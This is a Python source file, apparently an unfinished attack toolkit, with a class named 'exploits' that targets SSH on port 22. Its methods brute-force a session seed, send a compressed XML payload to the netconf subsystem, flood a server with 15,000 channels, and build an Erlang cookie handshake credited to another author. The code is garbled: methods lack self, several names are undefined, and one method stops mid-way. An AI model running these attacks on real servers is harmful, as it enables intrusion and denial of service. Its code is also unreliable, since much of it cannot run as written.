#!/bin/env python
import main
from csv import Sniffer
import socket
import connect_listen
from scapy.all import DNS, DNSQR, IP, sr1, UDP, ICMP
from scapy.all import *
from icmplib import ping, multiping, traceroute, resolve
from datetime import datetime
import time
import random
from sys import argv

# four errors, connect_listen.connect_listen(parameters)
# note to self that I want to find out what ssh libaries the session is using to generate brute_seed, and time if it matches then use the methods below
class exploits:
 def __init__(self, ip, recv_server, debug, dirx):
	 self.ip = ip
	 self.recv_server = recv_server
	 self.debug = debug
   # self.dirx = dirx

 def get_connect(self, *args ):
  for arg in args:
    outer = connect_listen.connect_listen(hostname = arg, port = 22, password = arg, username = arg)
    return outer

 def check_connection():
   os.system("nc -vz" + self.ip + "22" )

 def send_message(self):
   get_connect(None, None, None).read_data()
   print("... getting message from recv_server")
   get_connect(None, None, None).send()

     # create a new scapy packet right here then give the information and send to port 22
 def debug():
  if self.debug == 1:
   print("sniffing on port 22")
   sniff(filter = 'dst port 22')
	
 def get_recv_challenge(self):
   print("... getting the messages from the port 22 on the" + self.server)
   read_data = get_connect(None, None, None).read_data(1024)
   print(get_connect(None, None, None).get_message(sizeof(read_data)))
   return read_data
	 

 def sniff(self, stdin):
  print("")
  proc = subprocess.Popen('tcpdump -x', stdout=subprocess.PIPE)
  output = proc.stdout.read()
  return output


 def seed_gen(self, bruteseed, start_time):
	  seed_abuse = (startime + bruteseed)
	  get_connect(None, None, None).send(seed_abuse)
	  get_connect(None, None, None).keep_alive()
	  print(outer.get_message(self))

 def Eland_Exploit(self):
   start_time = datetime.now()
   new_time =  datetime.now() - start_time
   for x in range(100000):
     seed_gen(bruteseed = x /.1000000 , start_time = start_time)

 def xml_overflow(self):
  get_connect(None, None, None).invoke_subsytem("netconf")
  xml = """<?xml version='1.0' encoding='utf-8'?>
  <a>б</a>""" #xml document
  headers = {'Content-Type': 'application/xml'} # set what your server accepts
  get_connect(None, None, None).keep_alive()
  print("...compressing XML document")
  com = lzma.LZMACompressor(format=FORMAT_XZ, check=- 1, preset=None, filters=None)
  get_connect(None, None, None).send(content = com.compress(xml))
  get_connect(None, None, None).read_data(n).decode("UTF-8")


 def key_gen_rsa(self):
   print("GEN RSA KEY")
   return get_connect(None, None, None).key_gen()

 def channel_maker(self):
  for x in range (15000):
     get_connect(None, None, None).new_channel()
     get_connect(None, None, None).send(bytes(65535))
     print(get_connect)


 # Original Author: Milton Valencia (wetw0rk)
 def erlangcookie(self, stdin):
   name_msg  = b"\x00"
   name_msg += b"\x15"
   name_msg += b"n"
   name_msg += b"\x00\x07"
   name_msg += b"\x00\x03\x49\x9c"
   name_msg += b"AAAAAA@AAAAAAA"
   challenge_reply  = b"\x00\x15"
   challenge_reply += b"r"
   challenge_reply += b"\x01\x02\x03\x04"
   challenge_reply += md5(bytes(argv[1], "ascii") + bytes(str(get_recv_challenge()), "ascii")).digest()

